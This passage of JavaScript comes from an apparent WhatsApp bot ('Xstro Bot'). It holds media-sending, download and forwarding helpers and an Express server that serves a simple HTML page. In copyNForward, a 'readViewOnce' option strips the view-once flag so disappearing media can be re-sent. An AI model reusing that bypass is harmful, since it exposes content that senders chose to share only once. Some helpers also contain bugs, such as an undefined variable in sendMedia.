    buffer = await writeExifVid(buff, options);
   } else {
    buffer = await videoToWebp(buff);
   }
   await Bot.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
  };

  //========================================================================================================================================
  Bot.sendMedia = async (jid, path, fileName = "", caption = "", quoted = "", options = {}) => {
   let types = await Bot.getFile(path, true);
   let { mime, ext, res, data, filename } = types;
   if ((res && res.status !== 200) || file.length <= 65536) {
    try {
     throw { json: JSON.parse(file.toString()) };
    } catch (e) {
     if (e.json) throw e.json;
    }
   }
   let type = "",
    mimetype = mime,
    pathFile = filename;
   if (options.asDocument) type = "document";
   if (options.asSticker || /webp/.test(mime)) {
    let { writeExif } = require("./exif");
    let media = { mimetype: mime, data };
    pathFile = await writeExif(media, {
     packname: options.packname ? options.packname : Config.packname,
     author: options.author ? options.author : Config.author,
     categories: options.categories ? options.categories : [],
    });
    await fs.promises.unlink(filename);
    type = "sticker";
    mimetype = "image/webp";
   } else if (/image/.test(mime)) type = "image";
   else if (/video/.test(mime)) type = "video";
   else if (/audio/.test(mime)) type = "audio";
   else type = "document";
   await Bot.sendMessage(
    jid,
    {
     [type]: { url: pathFile },
     caption,
     mimetype,
     fileName,
     ...options,
    },
    { quoted, ...options }
   );
   return fs.promises.unlink(pathFile);
  };
  /**
   *
   * @param {*} message
   * @param {*} filename
   * @param {*} attachExtension
   * @returns
   */
  //========================================================================================================================================
  Bot.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
   let quoted = message.msg ? message.msg : message;
   let mime = (message.msg || message).mimetype || "";
   let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
   const stream = await downloadContentFromMessage(quoted, messageType);
   let buffer = Buffer.from([]);
   for await (const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk]);
   }
   let type = await FileType.fromBuffer(buffer);
   trueFileName = attachExtension ? filename + "." + type.ext : filename;
   // save to file
   await fs.writeFileSync(trueFileName, buffer);
   return trueFileName;
  };
  //========================================================================================================================================
  Bot.downloadMediaMessage = async message => {
   let mime = (message.msg || message).mimetype || "";
   let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
   const stream = await downloadContentFromMessage(message, messageType);
   let buffer = Buffer.from([]);
   for await (const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk]);
   }

   return buffer;
  };

  /**
   *
   * @param {*} jid
   * @param {*} message
   * @param {*} forceForward
   * @param {*} options
   * @returns
   */
  //========================================================================================================================================
  Bot.copyNForward = async (jid, message, forceForward = false, options = {}) => {
   let vtype;
   if (options.readViewOnce) {
    message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : message.message || undefined;
    vtype = Object.keys(message.message.viewOnceMessage.message)[0];
    delete (message.message && message.message.ignore ? message.message.ignore : message.message || undefined);
    delete message.message.viewOnceMessage.message[vtype].viewOnce;
    message.message = {
     ...message.message.viewOnceMessage.message,
    };
   }

   let mtype = Object.keys(message.message)[0];
   let content = await generateForwardMessageContent(message, forceForward);
   let ctype = Object.keys(content)[0];
   let context = {};
   if (mtype != "conversation") context = message.message[mtype].contextInfo;
   content[ctype].contextInfo = {
    ...context,
    ...content[ctype].contextInfo,
   };
   const waMessage = await generateWAMessageFromContent(
    jid,
    content,
    options
     ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo
         ? {
            contextInfo: {
             ...content[ctype].contextInfo,
             ...options.contextInfo,
            },
           }
         : {}),
       }
     : {}
   );
   await Bot.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
   return waMessage;
  };
  Bot.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   let mime = "";
   let res = await axios.head(url);
   mime = res.headers["content-type"];
   if (mime.split("/")[1] === "gif") {
    return Bot.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
   }
   let type = mime.split("/")[0] + "Message";
   if (mime === "application/pdf") {
    return Bot.sendMessage(jid, { document: await getBuffer(url), mimetype: "application/pdf", caption: caption, ...options }, { quoted: quoted, ...options });
   }
   if (mime.split("/")[0] === "image") {
    return Bot.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
   }
   if (mime.split("/")[0] === "video") {
    return Bot.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: "video/mp4", ...options }, { quoted: quoted, ...options });
   }
   if (mime.split("/")[0] === "audio") {
    return Bot.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: "audio/mpeg", ...options }, { quoted: quoted, ...options });
   }
  };

  //========================================================================================================================================
  Bot.cMod = (jid, copy, text = "", sender = Bot.user.id, options = {}) => {
   //let copy = message.toJSON()
   let mtype = Object.keys(copy.message)[0];
   let isEphemeral = mtype === "ephemeralMessage";
   if (isEphemeral) {
    mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
   }
   let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
   let content = msg[mtype];
   if (typeof content === "string") msg[mtype] = text || content;
   else if (content.caption) content.caption = text || content.caption;
   else if (content.text) content.text = text || content.text;
   if (typeof content !== "string")
    msg[mtype] = {
     ...content,
     ...options,
    };
   if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
   else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
   if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
   else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
   copy.key.remoteJid = jid;
   copy.key.fromMe = sender === Bot.user.id;

   return proto.WebMessageInfo.fromObject(copy);
  };

  /**
   *
   * @param {*} path
   * @returns
   */
  //========================================================================================================================================
  Bot.getFile = async (PATH, save) => {
   let res;
   let data = Buffer.isBuffer(PATH)
    ? PATH
    : /^data:.*?\/.*?;base64,/i.test(PATH)
    ? Buffer.from(PATH.split`,`[1], "base64")
    : /^https?:\/\//.test(PATH)
    ? await (res = await getBuffer(PATH))
    : fs.existsSync(PATH)
    ? ((filename = PATH), fs.readFileSync(PATH))
    : typeof PATH === "string"
    ? PATH
    : Buffer.alloc(0);
   //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
   let type = (await FileType.fromBuffer(data)) || {
    mime: "application/octet-stream",
    ext: ".bin",
   };
   let filename = path.join(__filename, __dirname + new Date() * 1 + "." + type.ext);
   if (data && save) fs.promises.writeFile(filename, data);
   return {
    res,
    filename,
    size: await getSizeMedia(data),
    ...type,
    data,
   };
  };
  //========================================================================================================================================
  Bot.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
   let types = await Bot.getFile(PATH, true);
   let { filename, size, ext, mime, data } = types;
   let type = "",
    mimetype = mime,
    pathFile = filename;
   if (options.asDocument) type = "document";
   if (options.asSticker || /webp/.test(mime)) {
    let { writeExif } = require("./exif.js");
    let media = { mimetype: mime, data };
    pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
    await fs.promises.unlink(filename);
    type = "sticker";
    mimetype = "image/webp";
   } else if (/image/.test(mime)) type = "image";
   else if (/video/.test(mime)) type = "video";
   else if (/audio/.test(mime)) type = "audio";
   else type = "document";
   await Bot.sendMessage(
    jid,
    {
     [type]: { url: pathFile },
     mimetype,
     fileName,
     ...options,
    },
    { quoted, ...options }
   );
   return fs.promises.unlink(pathFile);
  };
  //========================================================================================================================================
  Bot.parseMention = async text => {
   return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + "@s.whatsapp.net");
  };

  return Bot;
 }

 syncdb().catch(err => console.log(err));
 const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xstro Bot</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
</head>
<style>
/* Resetting default margin and padding */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Poppins', sans-serif;
    background-color: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    overflow: hidden;
    width: 360px;
}

header {
    background-color: #3f51b5;
    color: #ffffff;
    padding: 20px;
    text-align: center;
}

header h1 {
    font-size: 24px;
    font-weight: 600;
    margin-bottom: 5px;
}

header p {
    font-size: 14px;
    opacity: 0.8;
}

main {
    padding: 20px;
}

.message {
    margin-bottom: 15px;
}

.message-bubble {
    background-color: #e0e0e0;
    border-radius: 20px;
    padding: 10px 15px;
    max-width: 70%;
}

.message-bubble p {
    font-size: 14px;
    color: #333333;
    line-height: 1.4;
    margin: 0;
}

.user-input {
    display: flex;
}

.user-input input[type="text"] {
    flex: 1;
    padding: 10px;
    border: 1px solid #cccccc;
    border-radius: 5px 0 0 5px;
    font-size: 14px;
    outline: none;
}

.user-input button {
    background-color: #3f51b5;
    color: #ffffff;
    border: none;
    padding: 10px 15px;
    border-radius: 0 5px 5px 0;
    cursor: pointer;
    font-size: 14px;
    transition: background-color 0.3s ease;
}

.user-input button:hover {
    background-color: #2c3e50;
}

</style>
<body>
    <div class="container">
        <header>
            <h1>Xstro Bot</h1>
            <p>Your virtual assistant</p>
        </header>
        <main>
            <section class="message">
                <div class="message-bubble">
                    <p>Hello! How can I assist you today?</p>
                </div>
            </section>
            <section class="user-input">
                <input type="text" placeholder="Type your message...">
                <button>Send</button>
            </section>
        </main>
    </div>
</body>
</html>

`;
 app.get("/", (req, res) => res.type("html").send(html));
 app.listen(port, () => console.log(`Xstro Connected To http://localhost:${port}!`));
 //=============================[to get message of New Update of this file.]===================================================
 let file = require.resolve(__filename);
 fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(`Update ${__filename}`);
  delete require.cache[file];
  require(file);
 });
}, 3000);
